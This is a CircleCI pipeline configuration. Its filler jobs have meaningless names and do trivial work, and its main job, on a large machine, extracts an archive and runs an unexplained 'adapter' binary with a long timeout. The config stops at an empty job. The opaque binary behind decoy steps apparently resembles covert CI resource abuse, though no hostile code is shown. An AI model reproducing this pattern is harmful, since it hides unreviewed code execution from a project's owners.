version: 2.1

jobs:
  reload_jul4-ship:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: palm sand
          command: |
            mkdir -p /tmp/mid1
            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1; for(i=0;i<10;i++){a*=2}; print a}'; true ; } > /tmp/mid1/phase-5.out
            echo "gate jul4-ship: $(wc -c </tmp/mid1/phase-5.out) bytes total"
      - persist_to_workspace:
          root: /tmp/mid1
          paths:
            - phase-5.out
  jul4-ship:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/mid1
      - run:
          name: Ingest handoff
          command: |
            cat /tmp/mid1/phase-5.out
      - run:
          name: Grab main branch
          command: git clone --depth 1 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Sync asset bundles
          command: tar --extract --bzip2 --file=cache.tar.bz2
      - run:
          name: Pre-run checks
          command: df -h
      - run:
          no_output_timeout: 67m
          command: "$PWD/adapter"
  warmup_RolloutRelease:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/mid1
      - run:
          name: caprice
          command: |
            mkdir -p /tmp/mid1
            { set +o pipefail 2>/dev/null; grep -c . /etc/hostname 2>/dev/null || echo 0; true ; } > /tmp/mid1/big.bin
            echo "gate RolloutRelease: $(wc -c </tmp/mid1/big.bin) bytes total"
      - persist_to_workspace:
          root: /tmp/mid1
          paths:
            - big.bin
  RolloutRelease:
